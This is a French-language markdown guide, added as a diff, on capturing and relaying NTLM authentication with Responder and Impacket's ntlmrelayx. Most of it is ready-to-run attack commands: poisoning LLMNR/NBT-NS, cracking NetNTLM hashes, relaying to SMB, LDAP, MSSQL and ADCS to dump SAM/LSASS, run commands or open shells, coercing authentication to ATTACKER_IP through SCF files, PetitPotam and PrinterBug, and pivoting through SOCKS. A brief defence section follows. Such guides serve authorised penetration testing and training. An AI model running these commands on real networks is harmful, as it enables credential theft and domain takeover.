@@ -1,0 +1,440 @@
+# 🎭 Responder & NTLM Relay - Guide Complet
+
+Guide exhaustif pour capturer et relayer les authentifications NTLM avec Responder.
+
+---
+
+## 📖 Concepts de Base
+
+### Qu'est-ce que NTLM ?
+
+**NTLM** (NT LAN Manager) est un protocole d'authentification challenge-response utilisé par Windows.
+
+```
+Client → Server: NEGOTIATE_MESSAGE (demande d'auth)
+Server → Client: CHALLENGE_MESSAGE (challenge aléatoire)
+Client → Server: AUTHENTICATE_MESSAGE (hash du password + challenge)
+```
+
+### Qu'est-ce que Responder ?
+
+**Responder** empoisonne les protocoles de résolution de noms (LLMNR, NBT-NS, mDNS) pour capturer les credentials.
+
+```
+1. Victime cherche: \\SERVEURTYPO\share
+2. DNS ne répond pas → LLMNR/NBT-NS broadcast
+3. Responder répond: "C'est moi!"
+4. Victime s'authentifie → Credentials capturés
+```
+
+---
+
+## 1️⃣ Responder - Configuration
+
+### Installation
+
+```bash
+# Cloner le repo
+git clone https://github.com/lgandx/Responder
+cd Responder
+
+# Ou via apt
+apt install responder
+```
+
+### Configuration (Responder.conf)
+
+```ini
+[Responder Core]
+; Serveurs à activer
+SQL = On
+SMB = On
+RDP = On
+Kerberos = On
+FTP = On
+POP = On
+SMTP = On
+IMAP = On
+HTTP = On
+HTTPS = On
+DNS = On
+LDAP = On
+
+; Empoisonnement
+LLMNR = On
+NBT-NS = On
+MDNS = On
+
+; Options avancées
+; Challenge fixe pour cracker plus facilement
+Challenge = Random  ; ou 1122334455667788
+
+; Logging
+SessionLog = Responder-Session.log
+PoisonersLog = Poisoners-Session.log
+AnalyzeLog = Analyze-Session.log
+```
+
+---
+
+## 2️⃣ Capture de Hashes
+
+### Lancer Responder
+
+```bash
+# Mode basique
+sudo responder -I eth0
+
+# Avec analyse (sans empoisonnement)
+sudo responder -I eth0 -A
+
+# Forcer WPAD
+sudo responder -I eth0 -wF
+
+# Verbose
+sudo responder -I eth0 -v
+
+# Interface spécifique + WPAD + Fingerprint
+sudo responder -I eth0 -wFb
+```
+
+### Options importantes
+
+```bash
+-I  : Interface réseau
+-A  : Analyze mode (écoute passive)
+-w  : Start WPAD rogue server
+-F  : Force NTLM auth for WPAD
+-b  : Return basic HTTP auth
+-r  : Enable answers for netbios wredir suffix
+-d  : Enable answers for netbios domain suffix
+-f  : Fingerprint hosts
+-v  : Verbose mode
+```
+
+### Types de hashes capturés
+
+```
+NTLMv1   : Plus facile à cracker, rare aujourd'hui
+NTLMv2   : Standard actuel, plus difficile
+NetNTLMv1 : Format réseau de NTLMv1
+NetNTLMv2 : Format réseau de NTLMv2 (le plus courant)
+```
+
+### Exemple de hash capturé
+
+```
+[SMB] NTLMv2-SSP Client   : 192.168.1.100
+[SMB] NTLMv2-SSP Username : CORP\john.doe
+[SMB] NTLMv2-SSP Hash     : john.doe::CORP:1122334455667788:ABC123...:0101...
+```
+
+---
+
+## 3️⃣ Cracker les Hashes
+
+### Avec Hashcat
+
+```bash
+# NTLMv2 (NetNTLMv2) - Mode 5600
+hashcat -m 5600 hash.txt wordlist.txt
+
+# NTLMv1 (NetNTLMv1) - Mode 5500
+hashcat -m 5500 hash.txt wordlist.txt
+
+# Avec règles
+hashcat -m 5600 hash.txt wordlist.txt -r rules/best64.rule
+
+# Format du hash pour hashcat
+# username::domain:challenge:hmac:blob
+john.doe::CORP:1122334455667788:ABCD...:0101...
+```
+
+### Avec John the Ripper
+
+```bash
+# Auto-detect
+john hash.txt --wordlist=wordlist.txt
+
+# Spécifier le format
+john --format=netntlmv2 hash.txt --wordlist=wordlist.txt
+john --format=netntlmv1 hash.txt --wordlist=wordlist.txt
+```
+
+### Rainbow Tables pour NTLMv1
+
+```bash
+# Si challenge connu (ex: 1122334455667788)
+# Utiliser des rainbow tables pré-calculées
+
+# Ou forcer un challenge spécifique dans Responder.conf
+Challenge = 1122334455667788
+
+# Puis utiliser crack.sh ou rcracki
+```
+
+---
+
+## 4️⃣ NTLM Relay
+
+### Principe
+
+Au lieu de capturer les hashes, les **relayer** vers un autre service pour s'authentifier.
+
+```
+Victime → Attaquant (Responder) → Service Cible
+         [Relaie l'auth]         [Auth réussie!]
+```
+
+### Prérequis
+
+```
+✓ SMB Signing désactivé sur la cible (souvent le cas hors DC)
+✓ La victime a des droits sur la cible
+✓ Responder avec SMB et HTTP OFF
+```
+
+### Configuration Responder pour Relay
+
+```bash
+# Désactiver SMB et HTTP dans Responder.conf
+[Responder Core]
+SMB = Off
+HTTP = Off
+
+# Lancer Responder
+sudo responder -I eth0 -rv
+```
+
+### ntlmrelayx (Impacket)
+
+```bash
+# Relay vers SMB
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Relay vers LDAP
+ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker
+
+# Relay vers LDAPS
+ntlmrelayx.py -t ldaps://DC_IP --escalate-user attacker
+
+# Relay vers MSSQL
+ntlmrelayx.py -t mssql://SQL_SERVER -q "SELECT @@version"
+
+# Avec exécution de commande
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+
+# Avec dump SAM
+ntlmrelayx.py -tf targets.txt -smb2support --sam
+
+# Dump LSASS (silently)
+ntlmrelayx.py -tf targets.txt -smb2support --lsass
+
+# Interactive shell
+ntlmrelayx.py -tf targets.txt -smb2support -i
+# Puis: nc 127.0.0.1 11000
+```
+
+### Créer le fichier targets.txt
+
+```bash
+# Lister les machines sans SMB signing
+crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+
+# Ou avec nmap
+nmap --script smb-security-mode -p 445 192.168.1.0/24 | grep -B5 "signing disabled"
+```
+
+### Forcer l'authentification
+
+```bash
+# Si pas de trafic spontané, forcer la connexion
+
+# Via fichier .lnk malveillant (dans un partage)
+# L'icône pointe vers \\ATTACKER_IP\share
+
+# Via fichier .scf
+[Shell]
+Command=2
+IconFile=\\ATTACKER_IP\share\icon.ico
+
+# Via document Office
+# Insérer image depuis: \\ATTACKER_IP\image.png
+
+# Via PetitPotam (ADCS)
+python3 PetitPotam.py ATTACKER_IP DC_IP
+
+# Via PrinterBug
+python3 printerbug.py DOMAIN/user:password@TARGET_IP ATTACKER_IP
+```
+
+---
+
+## 5️⃣ Attaques Avancées
+
+### ADCS (Active Directory Certificate Services) Relay
+
+```bash
+# ESC8 - Relay vers ADCS Web Enrollment
+ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# Combiné avec PetitPotam pour obtenir un certificat DC
+python3 PetitPotam.py ATTACKER_IP DC_IP
+# → Relay vers ADCS
+# → Obtenir certificat DC
+# → Utiliser pour DCSync
+```
+
+### Shadow Credentials
+
+```bash
+# Relay vers LDAP avec shadow credentials
+ntlmrelayx.py -t ldap://DC_IP --shadow-credentials --shadow-target 'TARGET_COMPUTER$'
+```
+
+### RBCD (Resource-Based Constrained Delegation)
+
+```bash
+# Relay vers LDAP pour configurer RBCD
+ntlmrelayx.py -t ldap://DC_IP --delegate-access --escalate-user attacker
+
+# Puis exploiter avec getST.py
+getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/attacker -hashes :HASH
+```
+
+### Relay vers Exchange (PrivExchange)
+
+```bash
+# Relay vers Exchange pour obtenir DCSync
+ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker
+
+# Puis trigger avec PrivExchange
+python privexchange.py -ah ATTACKER_IP EXCHANGE_SERVER -u user -p password
+```
+
+---
+
+## 6️⃣ MultiRelay
+
+### Mode interactif
+
+```bash
+# Lancer en mode interactif
+ntlmrelayx.py -tf targets.txt -smb2support -i
+
+# Se connecter aux sessions
+nc 127.0.0.1 11000
+
+# Commandes
+> shares           # Lister les partages
+> use C$           # Monter un partage
+> ls               # Lister les fichiers
+> cat secret.txt   # Lire un fichier
+> put shell.exe    # Upload
+> get data.txt     # Download
+```
+
+### Socks Proxy
+
+```bash
+# Créer un proxy SOCKS pour les sessions relayées
+ntlmrelayx.py -tf targets.txt -smb2support -socks
+
+# Utiliser avec proxychains
+# /etc/proxychains.conf:
+# socks4 127.0.0.1 1080
+
+proxychains secretsdump.py -no-pass 'DOMAIN/USER'@TARGET
+proxychains smbclient //TARGET/C$ -U 'DOMAIN/USER' --pw-nt-hash
+```
+
+---
+
+## 7️⃣ Défense et Détection
+
+### Protections
+
+```powershell
+# Activer SMB Signing (GPO)
+# Computer Configuration → Policies → Windows Settings → Security Settings → 
+# Local Policies → Security Options
+# "Microsoft network server: Digitally sign communications (always)" = Enabled
+
+# Désactiver LLMNR
+# GPO: Computer Configuration → Administrative Templates → Network → DNS Client
+# "Turn off multicast name resolution" = Enabled
+
+# Désactiver NBT-NS
+# Via netsh ou registry
+netsh interface ipv4 set dnsserver "Ethernet" static 10.0.0.1 primary
+# Puis désactiver NetBIOS dans les propriétés TCP/IP
+
+# EPA (Extended Protection for Authentication) sur ADCS
+```
+
+### Détection
+
+```bash
+# Surveiller les événements
+# Event ID 4648: Explicit credentials logon
+# Event ID 4624: Successful logon (Type 3 = Network)
+# Event ID 4625: Failed logon
+
+# Détecter Responder
+# Trafic LLMNR suspect (source inhabituelle)
+# Réponses NBT-NS d'IP inconnue
+```
+
+---
+
+## 8️⃣ Cheatsheet Rapide
+
+```bash
+# Responder - Capture
+sudo responder -I eth0 -wFb
+
+# Responder - Pour relay (SMB/HTTP off)
+sudo responder -I eth0 -rv
+
+# Trouver les cibles sans SMB signing
+crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+
+# NTLM Relay basique
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Relay avec exécution
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+
+# Relay avec dump SAM
+ntlmrelayx.py -tf targets.txt -smb2support --sam
+
+# Relay vers LDAP (RBCD)
+ntlmrelayx.py -t ldap://DC_IP --delegate-access
+
+# Relay vers ADCS
+ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs
+
+# Forcer l'auth avec PetitPotam
+python3 PetitPotam.py ATTACKER_IP DC_IP
+
+# Cracker NTLMv2
+hashcat -m 5600 hash.txt wordlist.txt
+john --format=netntlmv2 hash.txt
+
+# Mode SOCKS
+ntlmrelayx.py -tf targets.txt -socks
+proxychains secretsdump.py 'USER'@TARGET
+```
+
+---
+
+## 📚 Ressources
+
+- **Responder** : https://github.com/lgandx/Responder
+- **Impacket** : https://github.com/fortra/impacket
+- **HackTricks NTLM Relay** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay
+- **The Hacker Recipes** : https://www.thehacker.recipes/ad/movement/ntlm/relay
+
+---
+
+**Tags:** `#responder #ntlm #relay #llmnr #nbt-ns #smb #ldap #adcs #petitpotam`
